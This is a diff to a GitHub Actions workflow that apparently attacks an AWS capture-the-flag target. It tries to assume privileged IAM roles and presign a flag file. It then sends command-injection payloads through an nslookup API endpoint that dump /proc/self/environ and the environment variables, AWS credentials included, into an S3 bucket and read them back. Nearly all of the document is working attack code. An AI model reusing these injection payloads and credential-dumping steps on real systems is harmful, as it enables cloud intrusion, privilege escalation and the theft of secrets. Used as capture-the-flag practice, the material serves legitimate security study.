@@ -19,26 +19,35 @@ jobs:
       - name: AWS identity
         run: aws sts get-caller-identity
 
-      - name: Try assuming privileged roles
+      - name: Try assume lambdaRole and CTFExecutionRole
         run: |
           echo "===== assume lambdaRole ====="
-          aws sts assume-role \
-            --role-arn arn:aws:iam::009661764077:role/lambdaRole \
-            --role-session-name pwned || echo "lambdaRole: denied"
+          aws sts assume-role --role-arn arn:aws:iam::009661764077:role/lambdaRole --role-session-name test 2>&1 || echo "denied"
           echo "===== assume CTFExecutionRole ====="
-          aws sts assume-role \
-            --role-arn arn:aws:iam::009661764077:role/CTFExecutionRole \
-            --role-session-name pwned || echo "CTFExecutionRole: denied"
+          aws sts assume-role --role-arn arn:aws:iam::009661764077:role/CTFExecutionRole --role-session-name test 2>&1 || echo "denied"
 
-      - name: If lambdaRole assumed - use its creds to read flag
+      - name: Try presign flag.txt - different API call than GetObject
         run: |
-          CREDS=$(aws sts assume-role \
-            --role-arn arn:aws:iam::009661764077:role/lambdaRole \
-            --role-session-name pwned 2>/dev/null) || true
-          if [ -n "$CREDS" ]; then
-            export AWS_ACCESS_KEY_ID=$(echo $CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['Credentials']['AccessKeyId'])")
-            export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['Credentials']['SecretAccessKey'])")
-            export AWS_SESSION_TOKEN=$(echo $CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['Credentials']['SessionToken'])")
-            echo "===== reading flag as lambdaRole ====="
-            aws s3 cp s3://codec4f26c862a321ef5/flag.txt -
-          fi
+          aws s3 presign s3://codec4f26c862a321ef5/flag.txt --expires-in 300 && echo "PRESIGN OK" || echo "presign denied"
+
+      - name: Injection - write flag into codec bucket under different key
+        run: |
+          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" \
+            -d '{"domain":";cat /proc/self/environ | tr \"\\0\" \"\\n\" > /tmp/environ.txt; aws s3 cp /tmp/environ.txt s3://codec4f26c862a321ef5/environ.txt --region us-east-1 2>&1"}'
+          sleep 5
+          echo "===== try read environ.txt back ====="
+          aws s3 cp s3://codec4f26c862a321ef5/environ.txt - || echo "denied"
+
+      - name: Injection - dump env vars including AWS creds to codec bucket
+        run: |
+          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" \
+            -d '{"domain":";env > /tmp/env.txt 2>&1; aws s3 cp /tmp/env.txt s3://codec4f26c862a321ef5/env.txt --region us-east-1 2>&1"}'
+          sleep 5
+          echo "===== try read env.txt back ====="
+          aws s3 cp s3://codec4f26c862a321ef5/env.txt - || echo "denied"
+
+      - name: List codec bucket to see if injection wrote anything
+        run: |
+          aws s3api list-objects-v2 --bucket codec4f26c862a321ef5 --output json || true
